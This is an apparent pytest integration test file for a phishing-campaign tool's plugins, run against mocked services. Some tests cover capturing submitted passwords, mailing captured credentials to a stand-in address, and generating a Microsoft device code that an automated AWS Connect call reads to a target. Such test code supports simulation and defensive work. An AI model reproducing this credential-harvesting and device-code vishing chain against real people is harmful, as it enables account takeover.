"""
Integration tests for plugins with mocked external services
"""
import pytest
from unittest.mock import Mock, patch, MagicMock
from plugins.registry import PluginRegistry


@pytest.fixture
def registry():
    """Create registry with built-in plugins"""
    reg = PluginRegistry()
    reg.discover_builtin_plugins()
    return reg


# Slack Integration Tests
@patch('plugins.builtin.slack.requests.post')
def test_slack_integration_success(mock_post, registry):
    """Test Slack plugin integration with successful API call"""
    plugin = registry.get_plugin("slack")
    
    mock_response = Mock()
    mock_response.status_code = 200
    mock_response.text = 'ok'
    mock_post.return_value = mock_response
    
    context = {
        'target': {'name': 'John Doe', 'email': 'john@example.com'}
    }
    config = {
        'webhook_url': 'https://hooks.slack.com/services/TEST/WEBHOOK',
        'message': 'Alert: {{target.name}} ({{target.email}})'
    }
    
    result = plugin.execute(context, config)
    
    # Verify API was called
    assert mock_post.called
    call_args = mock_post.call_args
    assert call_args[0][0] == 'https://hooks.slack.com/services/TEST/WEBHOOK'
    
    # Verify message was interpolated
    payload = call_args[1]['json']
    assert 'John Doe' in payload['text']
    assert 'john@example.com' in payload['text']


@patch('plugins.builtin.slack.requests.post')
def test_slack_integration_error_response(mock_post, registry):
    """Test Slack plugin handles API error responses"""
    plugin = registry.get_plugin("slack")
    
    mock_response = Mock()
    mock_response.status_code = 400
    mock_response.text = 'invalid_payload'
    mock_post.return_value = mock_response
    
    context = {}
    config = {
        'webhook_url': 'https://hooks.slack.com/services/TEST/WEBHOOK',
        'message': 'Test message'
    }
    
    result = plugin.execute(context, config)
    # Should handle error gracefully
    assert result is not None


# Pushover Integration Tests
@patch('plugins.builtin.pushover.requests.post')
def test_pushover_integration_success(mock_post, registry):
    """Test Pushover plugin integration with successful API call"""
    plugin = registry.get_plugin("pushover")
    
    mock_response = Mock()
    mock_response.status_code = 200
    mock_response.json.return_value = {'status': 1}
    mock_post.return_value = mock_response
    
    context = {
        'alert': {'title': 'Security Alert', 'message': 'Unauthorized access detected'}
    }
    config = {
        'api_token': 'test_api_token',
        'user_key': 'test_user_key',
        'message': '{{alert.title}}: {{alert.message}}'
    }
    
    result = plugin.execute(context, config)
    
    # Verify API was called
    assert mock_post.called
    call_args = mock_post.call_args
    assert 'api.pushover.net' in call_args[0][0]
    
    # Verify message was interpolated
    payload = call_args[1]['data']
    assert 'Security Alert' in payload['message']


# CAPTCHA Integration Tests
@patch('plugins.builtin.captcha.requests.post')
def test_captcha_integration_validation(mock_post, registry):
    """Test CAPTCHA plugin integration for token validation"""
    plugin = registry.get_plugin("captcha")
    
    mock_response = Mock()
    mock_response.status_code = 200
    mock_response.json.return_value = {
        'success': True,
        'challenge_ts': '2024-01-01T00:00:00Z',
        'hostname': 'example.com'
    }
    mock_post.return_value = mock_response
    
    context = {
        'request': {
            'form_data': {
                'cf-turnstile-response': 'valid-token-123'
            }
        }
    }
    config = {
        'captcha_type': 'turnstile',
        'site_key': 'test-site-key',
        'secret_key': 'test-secret-key',
        'mode': 'validate'
    }
    
    result = plugin.execute(context, config)
    
    # Verify API was called
    assert mock_post.called
    call_args = mock_post.call_args
    assert 'challenges.cloudflare.com' in call_args[0][0]
    
    # Verify validation result
    assert result['captcha_passed'] is True


# Database Integration Tests
def test_capture_credentials_database_integration(registry, db_session):
    """Test Capture Credentials plugin database integration"""
    from shared.database import Event
    
    plugin = registry.get_plugin("capture_credentials")
    
    context = {
        'campaign': {'id': 1},
        'request': {
            'form_data': {
                'email': 'test@example.com',
                'password': 'secret123',
                'phone': '555-1234'
            },
            'ip_address': '192.168.1.100',
            'user_agent': 'Mozilla/5.0'
        },
        'session': {'session_id': 'test-session-123'}
    }
    config = {
        'username_field': 'email',
        'password_field': 'password',
        'additional_fields': ['phone']
    }
    
    initial_count = Event.query.count()
    result = plugin.execute(context, config)
    final_count = Event.query.count()
    
    # Verify event was created
    assert final_count == initial_count + 1
    assert 'last_event_id' in result
    
    # Verify event data
    event = Event.query.get(result['last_event_id'])
    assert event.event_type == 'credentials'
    assert event.campaign_id == 1
    assert event.ip_address == '192.168.1.100'
    assert event.session_id == 'test-session-123'
    assert 'credentials' in event.data
    assert event.data['credentials']['username'] == 'test@example.com'
    assert event.data['credentials']['password'] == 'secret123'
    assert event.data['credentials']['phone'] == '555-1234'


def test_log_event_database_integration(registry, db_session):
    """Test Log Event plugin database integration"""
    from shared.database import Event
    
    plugin = registry.get_plugin("log_event")
    
    context = {
        'campaign': {'id': 1},
        'request': {
            'method': 'POST',
            'path': '/login',
            'ip_address': '192.168.1.100',
            'user_agent': 'Mozilla/5.0'
        },
        'session': {'session_id': 'test-session-456'}
    }
    config = {
        'event_type': 'form_submitted',
        'event_data': {
            'form_id': 'login_form',
            'action': 'submit'
        },
        'include_request_data': True,
        'include_session_data': True
    }
    
    initial_count = Event.query.count()
    result = plugin.execute(context, config)
    final_count = Event.query.count()
    
    # Verify event was created
    assert final_count == initial_count + 1
    assert 'last_event_id' in result
    
    # Verify event data
    event = Event.query.get(result['last_event_id'])
    assert event.event_type == 'form_submitted'
    assert event.campaign_id == 1
    assert 'request' in event.data
    assert event.data['request']['method'] == 'POST'
    assert event.data['request']['path'] == '/login'
    assert 'session' in event.data
    assert event.data['session']['session_id'] == 'test-session-456'


# Multi-Plugin Integration Tests
@patch('plugins.builtin.graphspy.requests.post')
@patch('plugins.builtin.aws_connect_dialer.BOTO3_AVAILABLE', True)
@patch('plugins.builtin.aws_connect_dialer.boto3')
def test_graphspy_aws_connect_integration(mock_boto3, mock_post, registry):
    """Test GraphSpy and AWS Connect integration together"""
    graphspy_plugin = registry.get_plugin("graphspy")
    aws_plugin = registry.get_plugin("aws_connect_dialer")
    
    # Mock GraphSpy response - returns text, not JSON
    mock_response = Mock()
    mock_response.status_code = 200
    mock_response.text = 'ABC123XYZ'  # GraphSpy returns device code as text
    mock_post.return_value = mock_response
    
    # Mock AWS Connect - uses boto3.client('connect')
    mock_connect_client = Mock()
    mock_connect_client.start_outbound_voice_contact.return_value = {'ContactId': 'test-123'}
    mock_boto3.client.return_value = mock_connect_client
    
    # Step 1: Generate device code with GraphSpy
    context = {}
    graphspy_config = {
        'graphspy_url': 'http://graphspy.example.com/api/generate_device_code',
        'format_for_speech': True
    }
    context = graphspy_plugin.execute(context, graphspy_config)
    
    # Verify device code was generated
    assert 'device_code' in context
    assert '<break' in context['device_code']  # SSML formatted
    
    # Step 2: Deliver via AWS Connect
    context['phone'] = '+1234567890'
    aws_config = {
        'instance_id': 'test-instance-id',
        'contact_flow_id': 'test-flow-id',
        'source_phone': '+1987654321',
        'target_phone_field': 'phone',
        'device_code_field': 'device_code'
    }
    context = aws_plugin.execute(context, aws_config)
    
    # Verify AWS Connect was called with device code
    assert mock_connect_client.start_outbound_voice_contact.called
    assert context['_call_result']['success'] is True
    assert context['_call_result']['contact_id'] == 'test-123'


@patch('plugins.builtin.smtp_sender.smtplib.SMTP')
def test_capture_credentials_smtp_integration(mock_smtp_class, registry, db_session):
    """Test Capture Credentials and SMTP integration"""
    capture_plugin = registry.get_plugin("capture_credentials")
    smtp_plugin = registry.get_plugin("smtp_sender")
    
    # Mock SMTP
    mock_smtp = Mock()
    mock_smtp_class.return_value = mock_smtp
    
    # Step 1: Capture credentials
    context = {
        'campaign': {'id': 1},
        'request': {
            'form_data': {
                'email': 'victim@example.com',
                'password': 'stolen123'
            },
            'ip_address': '192.168.1.100',
            'user_agent': 'Mozilla/5.0'
        }
    }
    capture_config = {
        'username_field': 'email',
        'password_field': 'password'
    }
    context = capture_plugin.execute(context, capture_config)
    
    # Verify credentials were captured
    assert 'captured_credentials' in context
    assert context['captured_credentials']['username'] == 'victim@example.com'
    
    # Step 2: Send notification via SMTP
    smtp_config = {
        'smtp_host': 'smtp.example.com',
        'from_email': 'alerts@example.com',
        'to_email': 'admin@example.com',
        'subject': 'Credentials Captured',
        'body_text': 'Username: {{captured_credentials.username}}, Password: {{captured_credentials.password}}'
    }
    context = smtp_plugin.execute(context, smtp_config)
    
    # Verify email was sent
    assert mock_smtp.send_message.called
    mock_smtp.quit.assert_called_once()
